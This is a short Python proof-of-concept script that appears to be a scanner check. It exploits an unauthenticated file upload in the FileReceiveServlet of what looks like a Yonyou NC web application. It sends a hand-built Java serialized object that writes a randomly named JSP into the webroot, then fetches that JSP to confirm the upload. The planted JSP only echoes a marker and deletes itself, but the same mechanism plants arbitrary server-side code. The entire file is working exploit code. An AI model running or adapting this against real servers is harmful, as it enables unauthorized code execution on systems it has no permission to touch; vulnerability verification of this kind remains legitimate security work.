import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r11=randomInt(10000, 20000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(1000000000, 2000000000)
r3="\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t"
r4=".jspt\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx"
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"/servlet/FileReceiveServlet"
	body=r3+str(r11)+r4+'<%out.print("'+str(r2)+'");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
	headers={'Content-Type': 'multipart/form-data;'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+"/"+str(r11)+".jsp"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r2) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
